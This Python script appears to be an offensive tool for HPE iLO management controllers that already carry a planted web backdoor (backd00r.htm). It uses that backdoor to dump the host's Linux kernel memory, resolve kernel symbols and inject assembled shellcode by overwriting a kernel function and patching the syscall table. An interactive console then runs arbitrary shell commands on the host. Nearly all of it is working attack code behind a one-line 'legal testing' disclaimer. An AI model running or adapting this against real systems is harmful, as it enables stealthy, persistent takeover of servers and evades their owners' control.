#!/usr/bin/env python3
"""
Python 3 compatible iLO Backdoor Commander
- All memory reads/writes are bytes-aware
- Keystone assembly returns bytes
- Base64 encoding for URL-safe transmission handled
- Use only in legal, controlled testing environments
"""

import sys
import time
import base64
import binascii
import code
import requests
from struct import pack, unpack_from
from keystone import Ks, KS_ARCH_X86, KS_MODE_64, KS_OPT_SYNTAX_NASM

if len(sys.argv) < 2:
    print("[-] usage: {} remote_addr".format(sys.argv[0]))
    sys.exit(1)


class iLOBackdoorCommander:
    def __init__(self, ilo_url):
        self.ilo_url = ilo_url.rstrip("/")
        self.symbols = {}
        self.kbase = 0xffffffff81000000
        self.pkbase = 0x1000000
        self.kdata = None
        self.temp_file = "/tmp/ilo_bd_tmp"
        self.backdoor_status = 0
        self.shared_page = None
        self.shared_page_addr = None
        self.backdoor_url = None
        # detect on init (may exit on connection problems)
        self.detect_backdoor()

    def help(self):
        print("""
==============================================================================

Welcome to the iLO Backdoor Commander.

    detect_backdoor(): checks for the backdoor presence on iLO and the Linux host
    install_linux_backdoor(): installs the Linux kernel backdoor if not present
    cmd(CMD): executes a Linux shell command
    remove_linux_backdoor(): removes the backdoor

Example:
    ib.detect_backdoor()
    ib.install_linux_backdoor()
    ib.cmd("/usr/bin/id")
    ib.remove_linux_backdoor()

==============================================================================
""")

    # helpers for packing/unpacking
    @staticmethod
    def p64(x: int) -> bytes:
        return pack("<Q", x)

    @staticmethod
    def u64(b: bytes) -> int:
        return unpack_from("<Q", b)[0]

    @staticmethod
    def u32(b: bytes) -> int:
        return unpack_from("<L", b)[0]

    def get_xml_version(self):
        xml_url = f"{self.ilo_url}/xmldata?item=all"
        try:
            r = requests.get(xml_url, verify=False, timeout=10)
        except Exception:
            print("[-] Connection error")
            sys.exit(1)
        if r.status_code != 200:
            return ""
        # r.content is bytes
        parts = r.content.split(b"FWRI")
        if len(parts) < 2:
            return ""
        # rough parsing similar to original
        self.ilo_version = parts[1][1:-2].decode(errors="ignore")
        print("[*] Found iLO version {}".format(self.ilo_version))
        return self.ilo_version

    def dump_memory(self, addr: int, count: int) -> bytes:
        """
        Read 'count' bytes from remote backdoor. Returns bytes (length == count, unless remote truncates).
        Backdoor expects hiaddr/loaddr as signed 32-bit-ish values like original script did.
        """
        asked_count = count
        addr_hi = addr >> 32
        if addr_hi > 0x7FFFFFFF:
            addr_hi -= 0x100000000
        addr_lo = addr & 0xFFFFFFFF
        if addr_lo > 0x7FFFFFFF:
            addr_lo -= 0x100000000

        # align count to 0x10000 boundary as original code
        if (count % 0x10000) != 0:
            count += (0x10000 - (count % 0x10000))

        dump_url = f"{self.backdoor_url}?act=dmp&hiaddr={addr_hi:x}&loaddr={addr_lo:x}&count={count:x}"
        r = requests.get(dump_url, verify=False, timeout=30)
        if r.status_code != 200:
            print("[-] Dump failed (HTTP {})".format(r.status_code))
            if len(r.content) > 0:
                print("\t{}".format(r.content))
            sys.exit(1)

        return r.content[:asked_count]

    def write_memory_128(self, addr: int, data: bytes) -> bytes:
        """
        Write up to 0x80 bytes at a time using base64 encoded payload in URL param.
        Returns bytes from the response (original code expected to compare returned content).
        """
        addr_hi = addr >> 32
        if addr_hi > 0x7FFFFFFF:
            addr_hi -= 0x100000000
        addr_lo = addr & 0xFFFFFFFF
        if addr_lo > 0x7FFFFFFF:
            addr_lo -= 0x100000000

        # base64 encode and escape '+' -> %2B so URL doesn't break (original did this)
        b64 = base64.b64encode(data).decode()
        b64_escaped = b64.replace("\n", "").replace("+", "%2B")
        write_url = f"{self.backdoor_url}?act=wmem&hiaddr={addr_hi:x}&loaddr={addr_lo:x}&data={b64_escaped}"
        r = requests.get(write_url, verify=False, timeout=30)
        if r.status_code != 200:
            print("[-] Write failed (HTTP {})".format(r.status_code))
            if len(r.content) > 0:
                print("\t{}".format(r.content))
            sys.exit(1)
        return r.content

    def write_memory(self, addr: int, data: bytes) -> bytes:
        """
        Write arbitrarily long 'data' by splitting into 0x80 sized chunks.
        Returns concatenation of responses (bytes).
        """
        wdata = b""
        for x in range(0, len(data), 0x80):
            chunk = data[x:x + 0x80]
            wdata += self.write_memory_128(addr + x, chunk)
        return wdata

    def resolve_func(self, func: str) -> int:
        """
        Find the virtual address of a function name inside dumped kernel data by:
          - locating ascii 'func\0' string in kdata
          - searching for occurrences of p64(vaddr) referencing the vaddr of that string
          - returning the pointer value found (u64 of preceding 8 bytes)
        Returns 0 on failure.
        """
        needle = (func + "\0").encode()
        off = self.kdata.find(needle)
        off_abs = 0
        ptr = 0
        while off != -1:
            vaddr = self.kbase + off_abs + off
            off2 = self.kdata.find(self.p64(vaddr))
            if off2 != -1:
                # preceding 8 bytes contain pointer to target (as original used)
                ptr = self.u64(self.kdata[off2 - 8:off2])
                print(f"[+] Found {func} @0x{ptr:x}")
                return ptr
            off_abs += off + 1
            off = self.kdata[off_abs:].find(needle)
        return ptr

    def add_symbol(self, sym_name: str, sym_addr: int):
        self.symbols[sym_name] = {"vaddr": sym_addr, "paddr": sym_addr - self.kbase + self.pkbase}

    def get_symbol(self, sym_name: str):
        sym_addr = self.resolve_func(sym_name)
        if sym_addr == 0:
            print(f"[-] Fail resolving symbol {sym_name}")
            sys.exit(1)
        self.add_symbol(sym_name, sym_addr)

    def get_kernel_symbols(self):
        """
        Heuristic-based symbol discovery similar to original script.
        """
        off = 0
        sys_call_table = 0
        # search for machine code pattern (kept behavior from original)
        pattern = binascii.unhexlify("89d1ff14c5")
        while off != -1:
            idx = self.kdata[off:].find(pattern)
            if idx == -1:
                break
            off = off + idx
            # check following bytes
            if self.kdata[off + 9:off + 11] == b"\x48\x89":
                # read 3 bytes little endian from offset off+5 as original code did
                sys_call_table = self.u32(self.kdata[off + 5:off + 9]) & 0xFFFFFF
                break
            off += 1

        if sys_call_table == 0:
            print("[-] Failed to locate syscall table pattern")
            sys.exit(1)

        sys_call_table_virt = sys_call_table + self.kbase
        print(f"[+] Found syscall table @0x{sys_call_table_virt:x}")
        self.add_symbol("sys_call_table", sys_call_table_virt)

        sys_read_ptr = self.u64(self.kdata[sys_call_table:])
        print(f"[+] Found sys_read @0x{sys_read_ptr:x}")
        self.add_symbol("sys_read", sys_read_ptr)

        # request other symbols by resolving their names in dumped kernel image
        for sym in [
            "call_usermodehelper", "serial8250_do_pm", "kthread_create_on_node",
            "wake_up_process", "__kmalloc", "slow_virt_to_phys", "msleep",
            "strcat", "kernel_read_file_from_path", "vfree"
        ]:
            self.get_symbol(sym)

    def asm_kshellcode(self) -> bytes:
        """
        Read template assembly file linux_backdoor.S (bytes), substitute numeric vaddrs
        into the template safely (decode -> format -> encode), then assemble with Keystone.
        """
        with open("linux_backdoor.S", "rb") as f:
            template = f.read().decode(errors="ignore")  # template as str for formatting

        # preserve original order from previous scripts
        vals = (
            self.symbols["sys_call_table"]["vaddr"],
            self.symbols["sys_read"]["vaddr"],
            self.symbols["kthread_create_on_node"]["vaddr"],
            self.symbols["wake_up_process"]["vaddr"],
            self.symbols["__kmalloc"]["vaddr"],
            self.symbols["slow_virt_to_phys"]["vaddr"],
            self.symbols["msleep"]["vaddr"],
            self.symbols["kernel_read_file_from_path"]["vaddr"],
            self.symbols["vfree"]["vaddr"],
            self.symbols["call_usermodehelper"]["vaddr"],
            self.symbols["strcat"]["vaddr"],
        )

        sc_str = template % vals  # string formatting with integers
        sc_bytes = sc_str.encode()  # back to bytes for assembler
        # assemble with Keystone (x86_64)
        ks = Ks(KS_ARCH_X86, KS_MODE_64)
        ks.syntax = KS_OPT_SYNTAX_NASM
        encoding, _ = ks.asm(sc_bytes)
        return bytes(encoding)

    def detect_backdoor(self):
        """
        Detect remote iLO backdoor and optionally linux component via shared page marker.
        """
        self.backdoor_url = f"{self.ilo_url}/backd00r.htm"
        try:
            r = requests.get(self.backdoor_url, verify=False, timeout=10)
        except Exception:
            print("[-] Connection error to iLO")
            return

        if r.status_code != 400:
            print("[-] iLO Backdoor not detected")
            return

        print("[+] iLO Backdoor found")
        self.backdoor_status = 1

        # dump a small region at pkbase to see if Linux backdoor present
        data = self.dump_memory(self.pkbase, 0xC)
        if data[:3] == b'ILO':
            print("[+] Linux Backdoor found")
            # the original script expected pointer at offset 4 (little endian u64)
            self.shared_page_addr = self.u64(data[4:12])
            self.backdoor_status = 2
        else:
            print("[-] Linux Backdoor not detected")

    def install_linux_backdoor(self):
        """
        Install linux backdoor shellcode by writing to chosen kernel locations and
        patching sys_call_table (as original script intended).
        """
        if self.backdoor_status == 0:
            print("[-] Missing iLO Backdoor...")
            return
        elif self.backdoor_status == 2:
            print("[*] Linux kernel backdoor already in place")
            return

        if self.kdata is None:
            print("[*] Dumping kernel (this may take a while)...")
            dump_count = 0x1000000  # as original
            self.kdata = self.dump_memory(self.pkbase, dump_count)
            with open("/tmp/kdata.bin", "wb") as f:
                f.write(self.kdata)
            print(f"[+] Dumped {len(self.kdata):x} bytes!")

        # discover symbols and assemble shellcode
        self.get_kernel_symbols()
        self.kshellcode = self.asm_kshellcode()
        # append null-terminated temp filename
        self.kshellcode += (self.temp_file + "\0").encode()

        # write shellcode to serial8250_do_pm paddr
        serial_paddr = self.symbols["serial8250_do_pm"]["paddr"]
        wdata = self.write_memory(serial_paddr, self.kshellcode)
        if wdata != self.kshellcode:
            print("[-] Data mismatch (1)")

        # write pointer to the shellcode into sys_call_table
        to_write = self.p64(self.symbols["serial8250_do_pm"]["vaddr"])
        wdata = self.write_memory(self.symbols["sys_call_table"]["paddr"], to_write)
        if wdata != to_write:
            print("[-] Data mismatch (2)")

        print("[+] Shellcode written")
        # notify backdoor presence by writing "ILO " + pointer at pkbase (as original)
        marker = b"ILO " + self.p64(self.symbols["serial8250_do_pm"]["paddr"] + 2)
        self.write_memory(self.pkbase, marker)
        # re-detect so shared_page (if any) is discovered
        self.detect_backdoor()

    def setup_channel(self):
        if self.shared_page_addr is None:
            print("[-] Don't know where to read shared page address...")
            return
        data = self.dump_memory(self.shared_page_addr, 16)
        ppage, vpage = unpack_from("<2Q", data)
        # original code used magic 0x4141414141414141 to indicate empty
        if ppage != 0x4141414141414141:
            print(f"[+] Found shared memory page! 0x{ppage:x} / 0x{vpage:x}")
            self.shared_page = ppage

    def cmd(self, my_cmd: str):
        """
        Execute a command through the installed kernel backdoor. Blocks up to 5s waiting for output.
        """
        if self.backdoor_status != 2:
            print("[-] Linux kernel backdoor required")
            return

        if self.shared_page is None:
            self.setup_channel()

        if self.shared_page is None:
            print("[-] Communication channel is down")
            return

        # write command (as bytes, null-terminated)
        cmd_bytes = (my_cmd + "\x00").encode()
        self.write_memory(self.shared_page + 0x10, cmd_bytes)
        self.write_memory(self.shared_page + 0x8, self.p64(len(cmd_bytes)))
        self.write_memory(self.shared_page, self.p64(1))  # notify

        # Wait up to 5 seconds for output ready flag
        timer1 = int(time.time())
        available_output = 0
        output_len = 0
        while (int(time.time()) - timer1) < 5:
            data = self.dump_memory(self.shared_page + 0x1010, 16)
            available_output, output_len = unpack_from("<2Q", data)
            if available_output == 1:
                break

        if available_output != 1:
            print("[-] Command timed out...")
            return

        command_output = self.dump_memory(self.shared_page + 0x1020, output_len)
        # clear available_output
        self.write_memory(self.shared_page + 0x1010, self.p64(0) + self.p64(0))

        # print as text if possible, else hex
        try:
            print(command_output.decode(errors="ignore"))
        except Exception:
            print(binascii.hexlify(command_output).decode())

    def remove_linux_backdoor(self):
        if self.backdoor_status != 2:
            print("[-] Linux kernel backdoor required")
            return

        if self.shared_page is None:
            self.setup_channel()
        if self.shared_page is None:
            print("[-] Communication channel is down")
            return

        # signal removal and wipe pkbase marker as original did
        self.write_memory(self.shared_page, self.p64(0xdead))
        self.write_memory(self.pkbase, b"\x7fELF")
        self.backdoor_status = 1
        self.shared_page = None


# disable insecure request warnings
requests.packages.urllib3.disable_warnings()

ilo_url = "https://{}".format(sys.argv[1])
ib = iLOBackdoorCommander(ilo_url)

# show helper and enter interactive shell
ib.help()
code.interact(local=dict(globals(), **locals()))
